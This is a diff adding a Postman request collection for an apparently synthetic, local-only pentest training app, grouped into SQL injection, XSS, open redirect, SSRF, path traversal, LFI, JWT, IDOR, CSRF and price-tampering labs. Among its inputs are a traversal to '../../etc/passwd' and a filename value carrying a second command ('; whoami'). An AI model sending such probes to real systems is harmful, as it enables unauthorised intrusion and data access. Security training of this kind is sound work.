@@ -1,0 +1,56 @@
+{
+  "info": {
+    "name": "LinkUp Local Pentest Lab",
+    "description": "Local-only request collection for the synthetic LinkUp training application. Set baseUrl to http://127.0.0.1:3000. Uses no external services.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    { "key": "baseUrl", "value": "http://127.0.0.1:3000" },
+    { "key": "postId", "value": "1" },
+    { "key": "userId", "value": "1" },
+    { "key": "orderId", "value": "1" },
+    { "key": "commentId", "value": "1" },
+    { "key": "labSession", "value": "" },
+    { "key": "jwt", "value": "" }
+  ],
+  "item": [
+    { "name": "Baseline", "item": [
+      { "name": "Health", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/health" } },
+      { "name": "Feed", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/feed" } },
+      { "name": "Endpoint directory", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/labs.html" } }
+    ]},
+    { "name": "SQL injection", "item": [
+      { "name": "Search baseline", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/search?q=alice" } },
+      { "name": "Search quote error", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/search?q=%27" } },
+      { "name": "Lab SQL endpoint baseline", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/labs/sql?username=alice" } },
+      { "name": "Lab auth SQLi baseline", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/labs/auth-sqli?username=alice&password=wrong" } }
+    ]},
+    { "name": "XSS and redirect", "item": [
+      { "name": "Reflected XSS page (inert marker)", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/lab/reflected?q=LINKUP-REFLECTED-MARKER" } },
+      { "name": "Stored lab comments", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/labs/comments" } },
+      { "name": "Open redirect (reserved .invalid host)", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/go?to=https%3A%2F%2Fexample.invalid%2Fpentest" } }
+    ]},
+    { "name": "Contained SSRF, file, and simulated command labs", "item": [
+      { "name": "SSRF mock metadata", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/labs/ssrf?url=http%3A%2F%2Fmock.internal%2Fmetadata%2Finstance" } },
+      { "name": "SSRF rejects local app destination", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/labs/ssrf?url=http%3A%2F%2F127.0.0.1%3A3000%2Fapi%2Fhealth" } },
+      { "name": "Virtual path traversal", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/labs/files?path=..%2F..%2Fprivate%2Fflag.txt" } },
+      { "name": "Virtual LFI", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/labs/include?page=..%2F..%2Fetc%2Fpasswd" } },
+      { "name": "Simulated command injection", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/labs/command?name=cover.jpg%3B%20whoami" } }
+    ]},
+    { "name": "Authentication, sessions, JWT, and access control", "item": [
+      { "name": "Login as synthetic alice", "request": { "method": "POST", "header": [{ "key": "Content-Type", "value": "application/json" }], "body": { "mode": "raw", "raw": "{\"username\":\"alice\",\"password\":\"alice123\"}" }, "url": "{{baseUrl}}/api/auth/login" } },
+      { "name": "Current user (add Cookie header in Postman if needed)", "request": { "method": "GET", "header": [{ "key": "Cookie", "value": "lab_session={{labSession}}" }], "url": "{{baseUrl}}/api/auth/me" } },
+      { "name": "IDOR user profile", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/users/{{userId}}" } },
+      { "name": "Issue weak lab JWT", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/labs/jwt/issue?username=alice" } },
+      { "name": "Verify lab JWT (set jwt variable)", "request": { "method": "GET", "header": [{ "key": "Authorization", "value": "Bearer {{jwt}}" }], "url": "{{baseUrl}}/api/labs/jwt/me" } },
+      { "name": "Admin user list (admin cookie required)", "request": { "method": "GET", "header": [{ "key": "Cookie", "value": "lab_session={{labSession}}" }], "url": "{{baseUrl}}/api/admin/users" } }
+    ]},
+    { "name": "CSRF and business logic", "item": [
+      { "name": "CSRF profile change (authenticated cookie required)", "request": { "method": "GET", "header": [{ "key": "Cookie", "value": "lab_session={{labSession}}" }], "url": "{{baseUrl}}/api/labs/csrf/profile?bio=CSRF-TEST-RESTORE-AFTER" } },
+      { "name": "Product listing", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/labs/shop/products" } },
+      { "name": "Checkout with tampered synthetic price (alice cookie required)", "request": { "method": "POST", "header": [{ "key": "Content-Type", "value": "application/json" }, { "key": "Cookie", "value": "lab_session={{labSession}}" }], "body": { "mode": "raw", "raw": "{\"productId\":\"mug\",\"quantity\":1,\"unitPrice\":0.01}" }, "url": "{{baseUrl}}/api/labs/shop/checkout" } },
+      { "name": "Order BOLA read (set orderId)", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/api/labs/shop/orders/{{orderId}}" } },
+      { "name": "Delete synthetic lab order after evidence", "request": { "method": "DELETE", "header": [], "url": "{{baseUrl}}/api/labs/shop/orders/{{orderId}}" } }
+    ]}
+  ]
+}
